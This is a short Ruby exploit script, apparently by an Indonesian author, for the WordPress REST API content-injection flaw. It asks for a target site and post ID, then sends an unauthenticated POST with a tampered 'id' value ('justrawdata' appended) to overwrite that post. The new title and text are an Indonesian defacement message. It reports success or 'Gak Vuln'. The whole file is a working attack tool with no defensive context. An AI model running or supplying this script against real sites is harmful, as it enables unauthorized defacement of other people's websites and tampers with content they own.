#author:zan

require 'rest-client'
require 'json'
puts "Enter Target URI (With wp directory)"
targeturi = gets.chomp
puts "Enter Post ID"
postid = gets.chomp.to_i
response = RestClient.post(
  "#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}",
  {

    "id" => "#{postid}justrawdata",
    "title" => "Silahkan Update WordPress",
    "content" => "Web ini buka kami retas cuma kami ingin memberi tau bahwa anda harus update wordpress anda (zan)"


  }.to_json,
  :content_type => :json,
  :accept => :json
) {|response, request, result| response }
if(response.code == 200)

puts "Done! '#{targeturi}/index.php?p=#{postid}'"


else
puts "Gak Vuln"
end